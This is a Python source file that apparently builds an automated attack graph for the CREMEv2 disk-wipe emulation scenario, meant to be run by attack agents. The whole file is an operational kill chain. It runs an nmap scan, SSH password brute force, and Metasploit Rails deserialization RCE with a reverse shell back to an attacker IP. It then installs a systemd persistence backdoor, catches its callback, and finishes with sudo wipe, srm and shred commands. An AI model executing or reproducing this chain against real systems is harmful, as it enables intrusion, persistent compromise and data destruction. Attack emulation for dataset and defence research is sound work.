"""
Example Attack Graph: CREME Disk Wipe Scenario

Follows CREMEv2 02_disk_wipe step-by-step.

Nodes are self-contained actions.
Edges carry checks (testable predicates) and reasoning (why this path).

  recon ──[port 22 open]──→ ssh_bruteforce
         ──[port 8181 open, OS Linux]──→ rails_exploit
  rails_exploit ──[session exists, is meterpreter]──→ persistence
  persistence ──[method installed]──→ reconnect
  reconnect ──[session exists]──→ disk_wipe
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_disk_wipe_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Gain access to the target server, establish persistence, "
                  "reconnect through the persistent backdoor, and wipe the disk.",
        target_ip=target_ip,
        name=f"creme_disk_wipe_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="CREMEv2 Disk Wipe scenario — 6-step kill chain.",
        metadata={"scenario": "02_disk_wipe", "source": "CREMEv2"},
    )

    # =========================================================================
    # NODES — each is fully self-contained
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface",
        objective=f"Full port scan with OS detection and service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -O -A --top-ports 1000 {target_ip}"],
        tags=["nmap", "full_scan", "os_detect"],
    ))

    graph.add_node(AttackNode(
        id="ssh_bruteforce",
        label="SSH Credential Guessing",
        tactic=Tactic.CREDENTIAL_ACCESS.value,
        technique_id="T1110.001",
        technique_name="Brute Force: Password Guessing",
        agent_type="exploit",
        goal="Gain initial access to the target",
        objective=f"Brute-force SSH login on {target_ip}:22 using username and password wordlists.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="auxiliary/scanner/ssh/ssh_login",
        module_options={
            "USER_FILE": "/home/kali/unix_users.txt",
            "PASS_FILE": "/home/kali/unix_passwords_modified.txt",
            "RHOSTS": target_ip,
            "RPORT": 22,
        },
        module_options_alternatives={
            "USERNAME": ["vagrant", "msfadmin"],
            "PASSWORD": ["vagrant", "msfadmin"],
        },
        tags=["ssh", "brute_force", "credential_access"],
    ))

    graph.add_node(AttackNode(
        id="rails_exploit",
        label="Rails Deserialization RCE",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Gain initial access to the target",
        objective=f"Exploit Rails secret deserialization on {target_ip}:8181 "
                  f"for reverse shell, then upgrade to meterpreter.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/multi/http/rails_secret_deserialization",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 8181,
            "TARGETURI": "/",
            "SECRET": "a7aebc287bba0ee4e64f947415a94e5f",
        },
        module_options_alternatives={
            "TARGETURI": ["/login", "/admin", "/sessions/new"],
            "RPORT": [3000, 8080, 80],
            "PAYLOAD": ["ruby/shell_bind_tcp", "cmd/unix/reverse_python"],
        },
        payload="ruby/shell_reverse_tcp",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4444,
        },
        metadata={
            "post_module": "post/multi/manage/shell_to_meterpreter",
            "post_options": {"SESSION": 1},
        },
        tags=["rails", "deserialization", "rce", "meterpreter"],
    ))

    graph.add_node(AttackNode(
        id="persistence",
        label="Service Persistence",
        tactic=Tactic.PERSISTENCE.value,
        technique_id="T1543.002",
        technique_name="Create or Modify System Process: Systemd Service",
        agent_type="persistence",
        goal="Maintain persistent access to the target",
        objective="Install a persistent service backdoor via meterpreter, "
                  "then kill all initial sessions.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/linux/local/service_persistence",
        module_options={
            "SESSION": 2,
            "VERBOSE": True,
        },
        module_options_alternatives={
            "SESSION": [1, 3],
            "PAYLOAD": ["cmd/unix/reverse_perl", "cmd/unix/reverse_bash"],
        },
        payload="cmd/unix/reverse_python",
        payload_options={
            "LHOST": attacker_ip,
        },
        metadata={"cleanup_sessions": [1, 2, 3]},
        tags=["persistence", "service", "systemd"],
    ))

    graph.add_node(AttackNode(
        id="reconnect",
        label="Catch Persistence Callback",
        tactic=Tactic.COMMAND_AND_CONTROL.value,
        technique_id="T1571",
        technique_name="Non-Standard Port",
        agent_type="exploit",
        goal="Re-establish access through persistent backdoor",
        objective="Start multi/handler to catch the persistence service callback.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/multi/handler",
        payload="cmd/unix/reverse_python",
        payload_options={
            "LHOST": attacker_ip,
        },
        tags=["handler", "listener", "c2", "reconnect"],
    ))

    graph.add_node(AttackNode(
        id="disk_wipe",
        label="Disk Wipe (/tmp)",
        tactic=Tactic.IMPACT.value,
        technique_id="T1561.001",
        technique_name="Disk Wipe: Disk Content Wipe",
        agent_type="impact",
        goal="Destroy data on the target system",
        objective="Install a wipe utility and destroy data on the target.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "{install_cmd}",
            "{wipe_cmd}",
        ],
        command_params={
            "install_cmd": "sudo apt-get install -y wipe",
            "wipe_cmd": "sudo wipe -f -q /tmp",
        },
        command_params_alternatives={
            # If wipe isn't available, try alternatives
            "install_cmd": [
                "sudo apt-get install -y secure-delete",
                "sudo apt-get install -y coreutils",  # for shred
            ],
            "wipe_cmd": [
                "sudo srm -rf /tmp/*",          # secure-delete
                "sudo find /tmp -type f -exec shred -vfz -n 1 {{}} \\;",  # shred
            ],
        },
        max_retries=3,
        metadata={"wipe_target": "/tmp"},
        tags=["destructive", "disk_wipe", "impact"],
    ))

    # =========================================================================
    # EDGES — checks + reasoning
    # =========================================================================

    # Recon found SSH open → try brute force
    graph.connect(
        "recon", "ssh_bruteforce",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 22, "service": "ssh"},
                description="SSH service is open on port 22",
            ),
        ],
        evidence="Nmap found SSH on port 22",
        rationale="SSH is open — attempt root brute force with common password list",
    )

    # Recon found Rails app on 8181 + Linux → exploit it
    graph.connect(
        "recon", "rails_exploit",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 8181},
                description="Rails application is running on port 8181",
            ),
            EdgeCheck(
                field="os_detected", operator="contains",
                expected="Linux",
                description="Target OS is Linux",
            ),
        ],
        evidence="Nmap found Rails app on port 8181, OS: Linux",
        rationale="Rails app with known secret_key_base — deserialization RCE is reliable on Linux",
    )

    # SSH bruteforce runs as opportunistic; rails_exploit proceeds regardless
    graph.connect(
        "ssh_bruteforce", "rails_exploit",
        checks=[],  # No checks — just sequencing
        evidence="SSH brute force completed (success or failure)",
        rationale="Rails exploit proceeds regardless — SSH was opportunistic noise",
        condition=EdgeCondition.ALWAYS.value,
    )

    # Got meterpreter session → install persistence
    graph.connect(
        "rails_exploit", "persistence",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Active session obtained",
            ),
            EdgeCheck(
                field="session_type", operator="equals",
                expected="meterpreter",
                description="Session is meterpreter (required for post modules)",
            ),
        ],
        evidence="Got reverse shell session 1, upgraded to meterpreter session 2",
        rationale="Meterpreter required for linux/local/service_persistence module",
    )

    # Persistence installed → start handler to catch callback
    graph.connect(
        "persistence", "reconnect",
        checks=[
            EdgeCheck(
                field="success", operator="equals",
                expected="True",
                description="Persistence mechanism was installed",
            ),
        ],
        evidence="Service persistence installed, original sessions terminated",
        rationale="All original sessions killed — need handler to catch "
                  "the persistence service callback",
    )

    # Reconnected via backdoor → execute disk wipe
    graph.connect(
        "reconnect", "disk_wipe",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="New session established via persistence callback",
            ),
        ],
        evidence="Caught persistence callback, new session active",
        rationale="Stable session through persistence — ready to execute disk wipe",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_disk_wipe_graph(
        target_ip="10.0.0.5",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/disk_wipe_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    # Round-trip test
    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")

    # Simulate recon success with findings
    print("\n--- Simulating recon findings ---")
    recon = loaded.get_node("recon")
    recon.mark_success(
        findings={
            "ports": [
                {"port": 22, "state": "open", "service": "ssh", "version": "OpenSSH 7.9"},
                {"port": 8181, "state": "open", "service": "http", "version": "WEBrick 1.4"},
            ],
            "os_detected": "Linux 4.15",
            "target_info": {"ip": "10.0.0.5"},
        },
        summary="Found SSH:22, Rails:8181, OS: Linux 4.15",
    )
    ready = loaded.ready_nodes()
    print(f"Ready after recon success: {ready}")

    # Simulate: what if port 8181 wasn't found?
    print("\n--- Simulating recon without port 8181 ---")
    recon.findings["ports"] = [
        {"port": 22, "state": "open", "service": "ssh", "version": "OpenSSH 7.9"},
    ]
    ready = loaded.ready_nodes()
    print(f"Ready without 8181: {ready}")
    print("  (rails_exploit should NOT be ready — port 8181 check fails)")
